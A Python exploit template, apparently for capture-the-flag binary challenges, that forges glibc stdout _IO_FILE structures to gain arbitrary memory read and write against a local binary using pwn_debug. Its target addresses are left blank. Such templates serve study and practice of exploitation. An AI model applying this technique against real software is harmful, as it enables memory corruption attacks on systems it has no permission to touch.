# File: IO_FILE_stdout_arbitraty.py
# Author: raycp
# Date: 2019-06-01
# Description: template for arbitraty read-write with stdout

from pwn_debug import *


pdbg=pwn_debug("./binary")

pdbg.context.terminal=['tmux', 'splitw', '-h']

#pdbg.local()
pdbg.debug("2.23")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")
membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc


def pwn():

	#pdbg.bp([])

    ## stdout arbitrary leaking of address read_target
    read_target=
    read_target_end=
    io_stdout_struct=IO_FILE_plus()
    
    flag=0
    flag&=~8
    flag|=0x800
    flag|=0x8000
    io_stdout_struct._flags=flag
    io_stdout_struct._IO_write_base= read_target                     # target address
    io_stdout_struct._IO_read_end=io_stdout_struct._IO_write_base
    io_stdout_struct._IO_write_ptr=read_target_end                   # target end
    io_stdout_struct._fileno=1
    io_stdout_struct.show()
    io_stdout_struct.arbitrary_read_check("stdout")
    


    ## stdout arbitrary write to address write_target
    write_target=
    write_target_end=
    flag=0
    flag&=~8
    flag|=0x8000
    io_stdout_write=IO_FILE_plus()
    io_stdout_write._flags=flag
    io_stdout_write._IO_write_ptr=write_target                       #target address

    io_stdout_write._IO_write_end=write_target_end                   #target end
    io_stdout_write.show()
    io_stdout_write.arbitrary_write_check("stdout")
    
    p.interactive() 

if __name__ == '__main__':
    pwn()


